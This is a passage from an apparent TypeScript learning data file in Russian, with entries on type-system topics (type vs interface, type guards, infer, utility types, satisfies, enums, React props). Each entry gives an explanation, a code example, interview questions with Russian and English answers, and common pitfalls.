            "Забывать про key remapping (as) и не уметь переименовывать ключи в новом типе.",
          ],
          practiceTask:
            "Напишите свой mapped type Nullable<T>, который делает каждое поле T либо исходного типа, либо null.",
          resources: {
            docs: [
              { title: "Mapped Types — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/mapped-types.html" },
            ],
            articles: [
              { title: "Mapped Types in TypeScript (Marius Schulz)", url: "https://mariusschulz.com/blog/mapped-types-in-typescript" },
              { title: "Mastering TypeScript Mapped Types (LogRocket)", url: "https://blog.logrocket.com/typescript-mapped-types/" },
            ],
          },
        },
      },
      {
        id: "ts-type-vs-interface",
        title: "type vs interface",
        content: {
          title: "type vs interface",
          shortExplanation:
            "interface и type во многом взаимозаменяемы для описания формы объекта, но у них разная механика расширения и разный набор возможностей: interface можно дополнять после объявления (declaration merging), а type умеет описывать union, intersection, примитивы и условные типы.",
          detailedExplanation:
            "interface поддерживает declaration merging — если объявить один и тот же interface дважды, TypeScript автоматически объединит их поля в один тип; это специально используется библиотеками для расширения чужих типов (например, для дополнения глобального Window или типов Express Request). type не умеет так объединяться — повторное объявление одного и того же type в одной области видимости даёт ошибку компиляции. С другой стороны, только type может описывать union (A | B), примитивные алиасы (type ID = string) и результат mapped/conditional типов — interface принципиально ограничен формой объекта (и классов). Для расширения используются разные синтаксисы: interface extends Other, тогда как type пересекается через &.",
          codeExample:
            "interface User { id: string; name: string; }\ninterface User { age: number; } // declaration merging — теперь User требует и age\n\ntype ID = string | number;         // type умеет union — interface так не может\ntype Admin = User & { role: 'admin' }; // intersection вместо extends",
          interviewQuestion: "Когда стоит выбрать interface, а когда type, если оба могут описать форму объекта?",
          interviewAnswerRu:
            "interface обычно выбирают для публичных API библиотек и контрактов, которые могут быть расширены извне (declaration merging), а также по соглашению для React-пропсов и классов — так исторически сложилось в большинстве кодовых баз. type выбирают, когда нужен union, intersection, примитивный алиас или результат mapped/conditional типа — то, что interface физически не может выразить. На практике многие команды фиксируют одно правило (например, 'всегда type, кроме пропсов библиотек') просто ради единообразия, а не из-за принципиальной технической разницы.",
          interviewAnswerEn:
            "interface is usually chosen for public library APIs and contracts that might be extended from outside (declaration merging), and by convention for React props and classes — mostly historical in most codebases. type is chosen when you need a union, an intersection, a primitive alias, or the result of a mapped/conditional type — things interface simply cannot express. In practice many teams just pick one convention (e.g. 'always type except for library props') purely for consistency rather than a hard technical requirement.",
          pitfalls: [
            "Пытаться описать union через interface — это невозможно, interface описывает только форму объекта.",
            "Не осознавать, что declaration merging для interface — это фича, а не баг, и полагаться на неё случайно (например, два одноимённых interface в разных файлах молча объединяются).",
          ],
        },
      },
      {
        id: "ts-intersection-types",
        title: "Intersection Types",
        content: {
          title: "Intersection Types (пересечение типов)",
          shortExplanation:
            "Intersection type (A & B) описывает значение, которое одновременно удовлетворяет всем перечисленным типам — в отличие от union (A | B), где значение соответствует хотя бы одному из них.",
          detailedExplanation:
            "Пересечение чаще всего используют для композиции: взять базовый тип и 'добавить' к нему дополнительные поля без изменения исходного определения — например, WithLoading<T> = T & { isLoading: boolean }. Если пересекаются два типа с одноимённым полем разных примитивных типов (например, { id: string } & { id: number }), поле id получает тип never, потому что ни одно значение не может быть одновременно строкой и числом — это частая причина неожиданных ошибок при пересечении сложных типов. Пересечение объектных типов ведёт себя предсказуемо (объединяет все поля), но пересечение примитивов или union с примитивом почти всегда даёт бессмысленный или пустой результат, поэтому его почти не применяют вне объектных форм.",
          codeExample:
            "type WithId = { id: string };\ntype WithTimestamps = { createdAt: Date; updatedAt: Date };\n\ntype Entity = WithId & WithTimestamps;\n// Entity = { id: string; createdAt: Date; updatedAt: Date }\n\ntype Conflict = { value: string } & { value: number }; // value: never — противоречие",
          interviewQuestion: "Чем отличается результат A & B от A | B, и почему пересечение с конфликтующим полем даёт never?",
          interviewAnswerRu:
            "Union A | B описывает значение, которое является одним ИЗ двух типов — при обращении к общему полю нужно сузить тип. Intersection A & B описывает значение, которое одновременно является И A, И B — то есть должно удовлетворять требованиям обоих типов сразу. Если одноимённое поле в A и B имеет непересекающиеся примитивные типы, единственное значение, подходящее сразу под оба, не существует — поэтому TypeScript выводит never, честно показывая, что такой тип логически невозможно создать.",
          interviewAnswerEn:
            "A union A | B describes a value that is one OR the other of two types — you need to narrow before touching a field specific to one side. An intersection A & B describes a value that is both A AND B at once — it must satisfy both types' requirements simultaneously. If a shared field in A and B has disjoint primitive types, no single value can satisfy both, so TypeScript infers never for that field, honestly showing that such a type is logically impossible to construct.",
          pitfalls: [
            "Пересекать примитивные типы напрямую (string & number) в надежде получить что-то осмысленное — результат всегда never.",
            "Не замечать конфликт полей при пересечении сложных типов и удивляться необъяснимой ошибке 'Type X is not assignable to type never'.",
          ],
        },
      },
      {
        id: "ts-type-guards",
        title: "Type Guards",
        content: {
          title: "Type Guards (пользовательские предикаты типов)",
          shortExplanation:
            "Type guard — функция, которая проверяет значение в рантайме и сообщает компилятору через специальную сигнатуру (value is Type), что внутри true-ветки значение можно безопасно считать более узким типом.",
          detailedExplanation:
            "Сигнатура function isUser(value: unknown): value is User говорит компилятору: 'если эта функция вернула true, считай value типом User дальше по коду' — сама проверка внутри функции при этом самая обычная (например, через 'id' in value && typeof (value as any).id === 'string'). Type guard особенно полезен для unknown-данных, пришедших извне (ответ API, localStorage, postMessage), где никакие встроенные операторы typeof/instanceof не помогают различить сложную форму объекта. Type guard можно комбинировать с массивами через .filter(isUser) — TypeScript умеет сузить тип результата с (User | null)[] до User[], если предикат имеет правильную сигнатуру is. В отличие от простого приведения через as, guard реально исполняет проверку в рантайме — поэтому он не может 'соврать' компилятору, если написан корректно.",
          codeExample:
            "interface User { id: string; name: string; }\n\nfunction isUser(value: unknown): value is User {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'id' in value &&\n    'name' in value\n  );\n}\n\nconst maybeUsers: unknown[] = await fetchRawData();\nconst users = maybeUsers.filter(isUser); // User[], а не unknown[]",
          interviewQuestion: "Чем кастомный type guard надёжнее, чем обычное приведение типов через as?",
          interviewAnswerRu:
            "as просто говорит компилятору 'поверь мне, тип именно такой' без какой-либо проверки в рантайме — если на самом деле форма данных другая, ошибка проявится позже и в неожиданном месте. Правильно написанный type guard реально проверяет структуру значения в момент вызова и возвращает true/false по факту, поэтому сужение типа основано на реальной проверке, а не на обещании программиста, которое может оказаться неверным.",
          interviewAnswerEn:
            "as just tells the compiler 'trust me, this is the type' with zero runtime verification — if the data's actual shape differs, the error surfaces later in some unrelated place. A properly written type guard actually inspects the value's structure at call time and returns true/false based on fact, so the narrowing is grounded in a real check rather than a programmer's promise that might be wrong.",
          pitfalls: [
            "Писать guard, чья сигнатура (value is Type) не соответствует тому, что функция реально проверяет — компилятор доверится сигнатуре, даже если проверка внутри неполная.",
            "Использовать as вместо guard для данных, пришедших с сервера, только потому что 'формально должно быть так'.",
          ],
        },
      },
      {
        id: "ts-unknown-vs-any",
        title: "unknown vs any",
        content: {
          title: "unknown vs any",
          shortExplanation:
            "any полностью отключает проверку типов для значения — с ним можно делать что угодно без ошибок компиляции; unknown тоже принимает значение любого типа, но не позволяет ничего с ним делать, пока тип не будет сужен явной проверкой.",
          detailedExplanation:
            "Присвоить значение типу any можно откуда угодно, и дальше TypeScript просто перестаёт что-либо проверять для этой переменной — по сути, это официальный 'выход' из системы типов, который может незаметно распространиться по всей цепочке дальнейших вызовов. unknown, напротив, безопасен: значению типа unknown можно присвоить что угодно, но использовать его (вызвать метод, обратиться к свойству, передать куда-то, где ожидается конкретный тип) нельзя, пока TypeScript не убедится через narrowing (typeof, instanceof, type guard), что тип сузился до чего-то конкретного. Именно поэтому unknown — правильный тип по умолчанию для данных, пришедших извне (ответ fetch, JSON.parse, catch (error)), где реальный тип неизвестен на этапе компиляции, но он рекомендуется как замена any 'для внешних данных, которые ещё не проверены'.",
          codeExample:
            "function handleError(error: unknown) {\n  // error.message; // Ошибка компиляции — unknown нельзя использовать напрямую\n  if (error instanceof Error) {\n    console.log(error.message); // OK — тип сужен до Error\n  }\n}\n\nfunction handleErrorUnsafe(error: any) {\n  console.log(error.message); // Компилируется, но упадёт в рантайме, если message нет\n}",
          interviewQuestion: "Почему в catch (error) с TypeScript 4.4+ тип error — unknown, а не any, и почему это правильно?",
          interviewAnswerRu:
            "В JavaScript можно бросить (throw) абсолютно любое значение, а не только объект Error — строку, число, что угодно. Поэтому TypeScript не может гарантировать, что у error действительно есть свойство message, и типизирует его как unknown, заставляя явно проверить форму (instanceof Error) перед использованием. Более старая версия TypeScript типизировала error как any, что позволяло писать error.message без проверки и получать рантайм-ошибку, если реально брошено было что-то другое, например строка.",
          interviewAnswerEn:
            "In JavaScript you can throw literally any value, not just an Error object — a string, a number, anything. So TypeScript can't guarantee error actually has a message property, and types it as unknown, forcing an explicit shape check (instanceof Error) before use. Older TypeScript versions typed error as any, which let you write error.message with no check and get a runtime crash if something else, like a plain string, was actually thrown.",
          pitfalls: [
            "Использовать any 'чтобы TypeScript отстал' вместо unknown с последующим narrowing — это тихо отключает проверку типов для всей цепочки использования значения.",
            "Обращаться к свойствам unknown-значения напрямую без предварительной проверки — компилятор корректно на это укажет ошибкой.",
          ],
        },
      },
      {
        id: "ts-keyof",
        title: "keyof",
        content: {
          title: "keyof",
          shortExplanation:
            "keyof T — оператор уровня типов, который возвращает union из всех имён ключей типа T как строковые (или числовые/символьные) литералы.",
          detailedExplanation:
            "Для type User = { id: string; name: string; age: number } тип keyof User эквивалентен 'id' | 'name' | 'age' — union из литералов, а не значение в рантайме. Это позволяет писать функции, которые принимают 'ключ этого объекта' и получают типовую защиту от опечаток и обращения к несуществующим полям — например, getProp<T, K extends keyof T>(obj: T, key: K): T[K]. keyof лежит в основе большинства встроенных mapped types (Partial, Pick, Record и других), которые внутри себя перебирают именно keyof T, чтобы построить новый тип на основе существующих ключей.",
          codeExample:
            "interface User { id: string; name: string; age: number; }\ntype UserKey = keyof User; // 'id' | 'name' | 'age'\n\nfunction getProp<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key];\n}\n\ngetProp({ id: '1', name: 'Alex', age: 30 }, 'age'); // number\ngetProp({ id: '1', name: 'Alex', age: 30 }, 'email'); // Ошибка — email не ключ User",
          interviewQuestion: "Как keyof помогает избежать опечаток при обращении к динамическому свойству объекта?",
          interviewAnswerRu:
            "Без keyof функция, принимающая имя свойства как строку (key: string), не может проверить на этапе компиляции, что такое свойство реально существует у объекта — опечатка вроде 'naem' вместо 'name' обнаружится только в рантайме или вообще не обнаружится. С key: keyof T компилятор точно знает допустимый набор строк и сразу подсветит ошибку при опечатке или обращении к несуществующему полю, а T[K] дополнительно даёт правильный тип возвращаемого значения для каждого конкретного ключа.",
          interviewAnswerEn:
            "Without keyof, a function taking a property name as a plain string (key: string) can't verify at compile time that such a property actually exists on the object — a typo like 'naem' instead of 'name' would only surface at runtime, if at all. With key: keyof T, the compiler knows exactly which strings are valid and immediately flags a typo or access to a non-existent field, while T[K] additionally gives the correct return type for each specific key.",
          pitfalls: [
            "Типизировать параметр 'имя поля' как обычный string вместо keyof T — теряется вся защита от опечаток.",
            "Забывать, что keyof — чисто типовая конструкция и не существует в скомпилированном JS-коде, поэтому её нельзя использовать как значение в рантайме напрямую.",
          ],
        },
      },
      {
        id: "ts-typeof-operator",
        title: "typeof (type operator)",
        content: {
          title: "typeof как оператор типов",
          shortExplanation:
            "В позиции типа typeof someValue берёт уже существующее рантайм-значение (переменную, константу, функцию) и превращает его форму в тип — это отдельная возможность TypeScript, не путать с рантайм-оператором typeof x, который возвращает строку.",
          detailedExplanation:
            "Это особенно полезно, когда 'источник истины' — значение, а не отдельно объявленный тип: например, объект конфигурации, константный массив или объект из внешней библиотеки. Вместо того чтобы дублировать структуру в отдельном interface (рискуя рассинхронизировать её с реальным значением), можно вывести тип прямо из значения через typeof config, и при изменении config тип автоматически обновится вслед за ним. Частая комбинация — typeof вместе с keyof: typeof someObject даёт форму объекта, а keyof typeof someObject — union из его реальных ключей, что удобно для строго типизированных enum-подобных объектов.",
          codeExample:
            "const ROUTES = {\n  home: '/',\n  profile: '/profile',\n  settings: '/settings',\n} as const;\n\ntype RouteKey = keyof typeof ROUTES;   // 'home' | 'profile' | 'settings'\ntype RoutePath = typeof ROUTES[RouteKey]; // '/' | '/profile' | '/settings'\n\nfunction navigate(key: RouteKey) { location.href = ROUTES[key]; }",
          interviewQuestion: "Чем typeof в типовой позиции отличается от рантайм-оператора typeof?",
          interviewAnswerRu:
            "Рантайм typeof x — это обычное выражение JavaScript, которое во время выполнения возвращает строку вроде 'string', 'number', 'object'. typeof x в позиции типа (например, в объявлении type T = typeof x) — это отдельная конструкция TypeScript, которая работает только на этапе компиляции и извлекает полный статический тип значения x, а не просто категорию 'string/number/object' — то есть typeof config даст точную форму объекта config со всеми его полями и их типами.",
          interviewAnswerEn:
            "Runtime typeof x is a plain JavaScript expression that, at execution time, returns a string like 'string', 'number', 'object'. typeof x in a type position (e.g. inside a type T = typeof x declaration) is a separate TypeScript construct that only works at compile time and extracts the full static type of value x — not just the coarse 'string/number/object' category — so typeof config gives the exact shape of the config object with all its fields and their types.",
          pitfalls: [
            "Путать typeof-тип с рантайм-typeof, будто это одна и та же конструкция, работающая 'и там, и там' одинаково.",
            "Дублировать структуру объекта вручную в отдельном interface вместо того, чтобы вывести её через typeof из уже существующего значения.",
          ],
        },
      },
      {
        id: "ts-infer",
        title: "infer",
        content: {
          title: "infer",
          shortExplanation:
            "infer используется внутри conditional type, чтобы 'извлечь' и присвоить имя части типа, которую компилятор выводит по контексту — например, тип возвращаемого значения функции или тип, обёрнутый в Promise/массив.",
          detailedExplanation:
            "infer работает только внутри условия extends: T extends (...args: any[]) => infer R ? R : never — здесь TypeScript пытается сопоставить T с сигнатурой функции, и если это удаётся, R становится типом возвращаемого значения этой функции. Именно так внутри устроены встроенные утилиты ReturnType<T> (извлекает возвращаемый тип функции) и Awaited<T> (рекурсивно разворачивает вложенные Promise<Promise<...>> до конечного значения). infer можно использовать и для собственных нужд — например, чтобы получить тип элемента массива (T extends (infer U)[] ? U : never) или тип пропсов компонента без обращения к его исходному коду.",
          codeExample:
            "type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n\nfunction getUser() { return { id: '1', name: 'Alex' }; }\ntype User = MyReturnType<typeof getUser>; // { id: string; name: string }\n\ntype ElementType<T> = T extends (infer U)[] ? U : never;\ntype Item = ElementType<string[]>; // string",
          interviewQuestion: "Как устроен ReturnType<T> внутри стандартной библиотеки TypeScript?",
          interviewAnswerRu:
            "ReturnType<T> определён примерно как T extends (...args: any[]) => infer R ? R : any — это conditional type, который проверяет, соответствует ли T сигнатуре функции, и если да, извлекает через infer тип R, стоящий на месте возвращаемого значения. Это позволяет получить тип результата функции, не объявляя его отдельно и не дублируя вручную — тип автоматически следует за реальной сигнатурой функции и обновляется вместе с ней.",
          interviewAnswerEn:
            "ReturnType<T> is defined roughly as T extends (...args: any[]) => infer R ? R : any — a conditional type that checks whether T matches a function signature, and if so, uses infer to pull out the type R sitting in the return position. This lets you get a function's result type without declaring it separately or duplicating it by hand — the type automatically tracks the function's actual signature and updates along with it.",
          pitfalls: [
            "Пытаться использовать infer вне позиции extends — это синтаксически недопустимо, infer работает только внутри conditional type.",
            "Писать слишком глубоко вложенные conditional types с несколькими infer — такой код становится крайне сложно читать и отлаживать.",
          ],
        },
      },
      {
        id: "ts-conditional-types",
        title: "Conditional Types",
        content: {
          title: "Conditional Types (условные типы)",
          shortExplanation:
            "Conditional type — конструкция вида T extends U ? X : Y, которая на уровне типов работает как тернарный оператор: выбирает один из двух типов в зависимости от того, является ли T подтипом U.",
          detailedExplanation:
            "Если T — это union, conditional type автоматически распределяется (distributive conditional types) по каждому члену union отдельно, а затем результаты объединяются обратно в union — например, ToArray<string | number> превратится в string[] | number[], а не в (string | number)[], если не обернуть T в квадратные скобки для отключения этого поведения. Условные типы особенно мощны в сочетании с infer (см. отдельную тему) — именно так строятся все утилиты, извлекающие часть типа по условию (ReturnType, Parameters, Awaited). Библиотечный код часто использует цепочки условных типов для реализации 'перегрузки' поведения на уровне типов — то есть разного результата для разных форм входного типа без написания отдельной функции для каждого случая.",
          codeExample:
            "type IsString<T> = T extends string ? true : false;\ntype A = IsString<'hello'>; // true\ntype B = IsString<42>;      // false\n\ntype ToArray<T> = T extends any ? T[] : never;\ntype C = ToArray<string | number>; // string[] | number[] — distributive",
          interviewQuestion: "Что такое distributive conditional types и когда это поведение может удивить?",
          interviewAnswerRu:
            "Когда T в T extends U ? X : Y — это 'голый' типовой параметр, а не обёрнутый в массив или объект, и в него подставляется union, TypeScript автоматически применяет условие к каждому члену union по отдельности, а затем объединяет результаты — это и называется distributive conditional type. Это может удивить, если ожидалось, что union обработается целиком за один проход: например, ToArray<string | number> станет string[] | number[], а не (string | number)[], если явно не отключить распределение через [T] extends [U] ? ... : ....",
          interviewAnswerEn:
            "When T in T extends U ? X : Y is a 'naked' type parameter (not wrapped in an array or object) and a union is passed in, TypeScript automatically applies the condition to each union member separately and then unions the results back together — that's a distributive conditional type. This can surprise you if you expected the union to be processed as a whole in one pass: for instance, ToArray<string | number> becomes string[] | number[] rather than (string | number)[], unless distribution is explicitly disabled via [T] extends [U] ? ... : ....",
          pitfalls: [
            "Не учитывать distributive-поведение при передаче union в conditional type и получать неожиданный union из результатов вместо одного объединённого типа.",
            "Злоупотреблять глубоко вложенными условными типами там, где обычная перегрузка функций или пара отдельных типов читались бы значительно проще.",
          ],
        },
      },
      {
        id: "ts-utility-types",
        title: "Utility Types",
        content: {
          title: "Utility Types: Partial, Pick, Omit, Record, Required, Readonly, ReturnType, Parameters, Awaited",
          shortExplanation:
            "Utility types — это встроенные в стандартную библиотеку TypeScript generic-типы для типичных трансформаций: сделать поля опциональными/обязательными, выбрать или исключить часть полей, описать словарь или извлечь тип из функции/промиса.",
          detailedExplanation:
            "Partial<T> делает все поля T опциональными (удобно для форм редактирования или частичных обновлений через PATCH-запросы), а Required<T> — наоборот, делает все поля обязательными, убирая знак ?. Pick<T, K> оставляет только перечисленные ключи K, а Omit<T, K> — исключает их, что особенно полезно для форм: например, Omit<User, 'id' | 'createdAt'> описывает данные для создания пользователя без полей, которые генерирует сервер. Record<K, V> строит тип словаря с ключами K и значениями V (Record<string, number> — объект вида { [key: string]: number }), а Readonly<T> запрещает переприсваивание полей на уровне типов (хотя не защищает от мутации в рантайме). ReturnType<T> и Parameters<T> извлекают соответственно тип возвращаемого значения и тип кортежа аргументов функции, а Awaited<T> рекурсивно разворачивает Promise, что особенно полезно для получения типа результата async-функции без ручного описания.",
          codeExample:
            "interface User { id: string; name: string; email: string; createdAt: Date; }\n\ntype UserDraft = Omit<User, 'id' | 'createdAt'>; // для формы создания\ntype UserPatch = Partial<Pick<User, 'name' | 'email'>>; // для частичного обновления\ntype UsersById = Record<string, User>; // словарь пользователей по id\n\nasync function fetchUser(): Promise<User> { /* ... */ return {} as User; }\ntype FetchedUser = Awaited<ReturnType<typeof fetchUser>>; // User, а не Promise<User>",
          interviewQuestion: "Как связаны Omit<User, 'id'> и Pick<User, ...> — можно ли выразить одно через другое?",
          interviewAnswerRu:
            "Да, Omit<T, K> технически определён через Pick: Omit<T, K> = Pick<T, Exclude<keyof T, K>> — то есть 'исключить ключи K' реализовано как 'оставить все ключи, кроме K', вычисленные через Exclude из полного списка keyof T. Понимание этой связи помогает не воспринимать utility types как отдельную магию, а видеть, что все они построены из небольшого набора базовых операций — mapped types, conditional types, keyof — скомбинированных по-разному.",
          interviewAnswerEn:
            "Yes — Omit<T, K> is technically defined in terms of Pick: Omit<T, K> = Pick<T, Exclude<keyof T, K>>, meaning 'exclude keys K' is implemented as 'keep all keys except K', computed via Exclude over the full keyof T list. Understanding this connection helps you see utility types not as separate magic, but as all built from a small set of underlying primitives — mapped types, conditional types, keyof — combined in different ways.",
          pitfalls: [
            "Использовать Partial<T> для типа ответа API, где на самом деле все поля обязательны — это скрывает реальные баги вместо того, чтобы их ловить.",
            "Забывать, что Readonly<T> — это только проверка на этапе компиляции; в рантайме объект всё ещё можно мутировать напрямую или через as.",
          ],
        },
      },
      {
        id: "ts-as-const",
        title: "as const",
        content: {
          title: "as const",
          shortExplanation:
            "as const превращает литеральное значение (массив, объект, строку) в максимально узкий, неизменяемый (readonly) тип — вместо string TypeScript выведет конкретный литерал 'admin', а массив станет кортежем с readonly полями.",
          detailedExplanation:
            "Без as const TypeScript обычно 'обобщает' литералы при выводе типа: const status = 'active' без явной аннотации внутри объекта или массива часто выводится как string, а не как литерал 'active' — это удобно для переменных, которые потом переприсваиваются, но неудобно, когда важно сохранить именно точное значение, например для discriminated union. as const после значения фиксирует именно те литералы, что написаны в коде, и дополнительно делает массивы/объекты readonly, запрещая мутацию на уровне типов. Это особенно полезно вместе с typeof и keyof: as const на объекте конфигурации даёт возможность вывести из него строгий union допустимых значений вместо того, чтобы дублировать этот union вручную в отдельном type.",
          codeExample:
            "const status1 = 'active'; // тип: string (в некоторых контекстах)\nconst status2 = 'active' as const; // тип: 'active' — точный литерал\n\nconst COLORS = ['red', 'green', 'blue'] as const;\n// тип COLORS: readonly ['red', 'green', 'blue'], а не string[]\ntype Color = typeof COLORS[number]; // 'red' | 'green' | 'blue'",
          interviewQuestion: "Зачем нужен as const, если можно явно указать тип литерала аннотацией?",
          interviewAnswerRu:
            "Явная аннотация типа для каждого поля объекта или элемента массива работает, но требует дублирования и легко расходится с реальным значением при изменениях. as const делает это автоматически для всей структуры разом, выводя точные литералы прямо из значения — и, что важнее, позволяет затем через typeof и keyof/индексирование получить строгий union допустимых значений без единой ручной аннотации, что особенно ценно для конфигов, списков маршрутов, наборов допустимых статусов.",
          interviewAnswerEn:
            "Explicitly annotating the type for every object field or array element works, but requires duplication and easily drifts from the actual value as it changes. as const does this automatically for the whole structure at once, deriving exact literals straight from the value — and, more importantly, then lets you get a strict union of valid values via typeof and keyof/indexing without a single manual annotation, which is especially valuable for configs, route lists, and sets of valid statuses.",
          pitfalls: [
            "Забывать as const на объекте конфигурации и удивляться, что typeof config[key] даёт string вместо конкретных литералов.",
            "Пытаться мутировать массив/объект, помеченный as const, — TypeScript корректно на это укажет ошибкой, но это может быть неожиданно для тех, кто не знал о readonly-эффекте.",
          ],
        },
      },
      {
        id: "ts-satisfies",
        title: "satisfies",
        content: {
          title: "satisfies",
          shortExplanation:
            "satisfies проверяет, что значение соответствует указанному типу, но, в отличие от явной аннотации (: Type), не 'обобщает' выведенный тип значения — компилятор по-прежнему знает точные литералы и точную форму, какие были в самом значении.",
          detailedExplanation:
            "Если написать const config: Record<string, string | number> = {...}, TypeScript действительно проверит совместимость, но дальше будет считать каждое поле config типом string | number, даже если оно по факту всегда конкретное число — из-за этого при обращении к config.retries теряется точный литеральный/числовой тип. const config = {...} satisfies Record<string, string | number> делает ту же проверку совместимости с типом, но тип самой переменной config выводится из исходного литерала как обычно (со всеми точными полями), а не сужается до заявленного типа проверки. Это особенно ценно в сочетании с as const: сначала satisfies проверяет структуру на соответствие ожидаемой форме (например, что все значения — либо строка, либо число), а as const дополнительно фиксирует точные литералы для последующего использования через typeof/keyof.",
          codeExample:
            "type Config = Record<string, string | number>;\n\nconst configAnnotated: Config = { retries: 3, timeout: 1000 };\nconfigAnnotated.retries; // тип: string | number — точность потеряна\n\nconst configSatisfies = { retries: 3, timeout: 1000 } satisfies Config;\nconfigSatisfies.retries; // тип: number — точный тип сохранён, но совместимость с Config проверена",
          interviewQuestion: "В чём разница между обычной аннотацией типа и satisfies при присваивании объекта?",
          interviewAnswerRu:
            "Обычная аннотация (const x: Type = value) заставляет TypeScript проверить совместимость и одновременно 'обобщить' тип переменной до заявленного Type — точные литералы и более узкие поля значения теряются. satisfies тоже проверяет совместимость с типом, но не влияет на выводимый тип переменной — TypeScript продолжает видеть исходную, максимально точную форму значения, что даёт и проверку типов, и точный автокомплит/литералы одновременно, без необходимости выбирать одно из двух.",
          interviewAnswerEn:
            "A regular annotation (const x: Type = value) makes TypeScript check compatibility and simultaneously widen the variable's type to the declared Type — exact literals and narrower fields of the value get lost. satisfies also checks compatibility with the type, but doesn't affect the inferred type of the variable — TypeScript keeps seeing the original, most precise shape of the value, giving you both type checking and exact literals/autocomplete at the same time, without having to pick one over the other.",
          pitfalls: [
            "Использовать обычную аннотацию там, где важно сохранить точные литеральные типы значений (например, для строгих discriminated unions конфигурации).",
            "Путать satisfies с as — satisfies реально проверяет совместимость и покажет ошибку при несоответствии, тогда как as просто 'заставляет поверить' без проверки.",
          ],
        },
      },
      {
        id: "ts-enums-vs-union-literals",
        title: "Enums vs Union Literals",
        content: {
          title: "Enums vs Union Literals",
          shortExplanation:
            "enum создаёт реальную рантайм-структуру (объект в скомпилированном JS), тогда как union из строковых литералов ('active' | 'inactive') существует только на уровне типов и не порождает никакого JS-кода.",
          detailedExplanation:
            "Числовой enum по умолчанию генерирует двустороннее отображение (Status.Active === 0 и Status[0] === 'Active' одновременно), что раздувает скомпилированный код и может путать при сериализации в JSON. const enum решает проблему раздутого кода (значения инлайнятся на этапе компиляции), но несовместим с некоторыми сборщиками/режимами (isolatedModules, используемым в большинстве современных тулчейнов вроде Vite/esbuild) и поэтому его использование сейчас часто не рекомендуется. Union из строковых литералов не требует импорта рантайм-объекта, отлично сериализуется в JSON как есть, и по умолчанию сегодня считается более идиоматичным выбором для React/TS-проектов — особенно в сочетании с as const для объекта-словаря, если всё же нужен доступ 'по значению', а не только тип.",
          codeExample:
            "// enum — создаёт реальный объект в рантайме\nenum StatusEnum { Active, Inactive }\n\n// union из литералов — существует только в типах\ntype StatusUnion = 'active' | 'inactive';\n\n// если нужен и рантайм-доступ, и типовая строгость:\nconst STATUS = { active: 'active', inactive: 'inactive' } as const;\ntype Status = typeof STATUS[keyof typeof STATUS]; // 'active' | 'inactive'",
          interviewQuestion: "Почему многие современные TS-кодовые базы избегают enum в пользу union строковых литералов?",
          interviewAnswerRu:
            "enum генерирует реальный JS-объект в скомпилированном коде, что добавляет лишний рантайм-код и может создавать сложности при сериализации/десериализации (особенно для числовых enum с двусторонним отображением). Union из строковых литералов не требует импорта рантайм-сущности, работает предсказуемо с JSON.stringify/parse и проще интегрируется с внешними API, которые оперируют обычными строками, а не специальным enum-объектом.",
          interviewAnswerEn:
            "enum generates a real JS object in the compiled output, adding runtime code and creating friction around serialization/deserialization (especially for numeric enums with their two-way mapping). A string literal union requires no runtime entity import, behaves predictably with JSON.stringify/parse, and integrates more simply with external APIs that just deal in plain strings rather than a special enum object.",
          pitfalls: [
            "Использовать const enum в проекте, собираемом через esbuild/Vite/Babel с isolatedModules — это может привести к ошибке сборки или неверной транспиляции.",
            "Полагаться на автоматическую нумерацию числового enum и вставлять новое значение в середину списка — это сдвигает числовые значения всех последующих элементов.",
          ],
        },
      },
      {
        id: "ts-typing-react-props",
        title: "Типизация React-пропсов",
        content: {
          title: "Типизация React-пропсов",
          shortExplanation:
            "Пропсы компонента обычно описывают через interface или type с суффиксом Props, включая опциональные поля со знаком ?, значения по умолчанию через деструктуризацию и специальный тип для children.",
          detailedExplanation:
            "React.ReactNode — самый широкий и обычно правильный тип для children (принимает строки, числа, JSX, массивы, null/undefined), тогда как JSX.Element уже — он не включает null или строку и подходит только там, где компонент гарантированно рендерит именно JSX-элемент. Для пропсов, принимающих обработчик события, правильный тип — не просто Function, а конкретная сигнатура вроде (event: React.MouseEvent<HTMLButtonElement>) => void, которая даёт автокомплит по полям события. Компонент с generic-пропсами (например, универсальный List<T>) описывается как generic-функция: function List<T>(props: { items: T[]; renderItem: (item: T) => ReactNode }) — это позволяет получить типизацию 'элемент массива -> то, что рендерит renderItem' для любого конкретного T при каждом использовании компонента.",
          codeExample:
            "interface ButtonProps {\n  children: React.ReactNode;\n  variant?: 'primary' | 'secondary'; // опционально, со значением по умолчанию в деструктуризации\n  onClick?: (event: React.MouseEvent<HTMLButtonElement>) => void;\n}\n\nfunction Button({ children, variant = 'primary', onClick }: ButtonProps) {\n  return <button className={variant} onClick={onClick}>{children}</button>;\n}",
          interviewQuestion: "Чем React.ReactNode отличается от JSX.Element как тип для children?",
          interviewAnswerRu:
            "JSX.Element — это тип конкретно одного JSX-выражения (<div />), он не включает строки, числа, массивы, boolean, null или undefined, поэтому его использование для children слишком строго и не даст скомпилироваться самому обычному коду вроде <Button>Текст</Button>. React.ReactNode — гораздо более широкий тип-объединение, включающий JSX.Element, строки, числа, фрагменты, массивы узлов и null/undefined, и именно поэтому это правильный тип по умолчанию для children и для любого пропса, который просто 'рендерит то, что дали'.",
          interviewAnswerEn:
            "JSX.Element is the type of exactly one JSX expression (<div />) — it doesn't include strings, numbers, arrays, booleans, null, or undefined, so using it for children is too strict and won't even compile something as ordinary as <Button>Text</Button>. React.ReactNode is a much broader union type that includes JSX.Element, strings, numbers, fragments, arrays of nodes, and null/undefined, which is why it's the correct default type for children and for any prop that simply 'renders whatever it's given'.",
          pitfalls: [
            "Типизировать children как JSX.Element и ловить ошибки компиляции на обычном текстовом содержимом компонента.",
            "Типизировать обработчик события как generic Function вместо конкретной React-сигнатуры события — теряется автокомплит и защита от неверной сигнатуры колбэка.",
          ],
        },
      },
      {
        id: "ts-typing-events",
        title: "Типизация событий",
        content: {
          title: "Типизация событий (React SyntheticEvent)",
          shortExplanation:
            "React оборачивает нативные DOM-события в SyntheticEvent — кросс-браузерную обёртку с тем же API, что и у нативного события, и типизирует конкретные его разновидности через дженерик, параметризованный типом DOM-элемента.",
          detailedExplanation:
